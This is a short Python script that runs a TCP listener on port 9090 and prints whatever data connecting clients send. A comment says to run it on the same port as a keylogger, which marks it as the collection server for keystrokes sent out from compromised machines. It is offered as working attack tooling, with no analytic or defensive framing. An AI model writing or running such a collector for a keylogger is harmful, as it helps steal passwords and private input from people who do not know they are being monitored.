import socket
# Define the listening IP and port
listen_ip = "0.0.0.0"  # Listen on all available interfaces
listen_port = 9090 #Make sure you are running listener on the same port as keylogger
# Function to start the listener
def start_listener():
    try:
        # Create a socket object
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Bind the socket to the IP and port
        s.bind((listen_ip, listen_port))
        # Listen for incoming connections
        s.listen(5)
        print("[+] Listening on {}:{}".format(listen_ip, listen_port))
        # Accept incoming connections
        while True:
            try:
                client_socket, addr = s.accept()
                print("[+] Connection from {}:{}".format(addr[0], addr[1]))
                # Receive data from the client
                data = client_socket.recv(1024)
                print("[+] Received data:", data.decode())
                # Close the client socket
                client_socket.close()
            except KeyboardInterrupt:
                print("\n[+] Stopping listener...")
                break
    except Exception as e:
        print("[-] Error:", e)
# Start the listener
start_listener()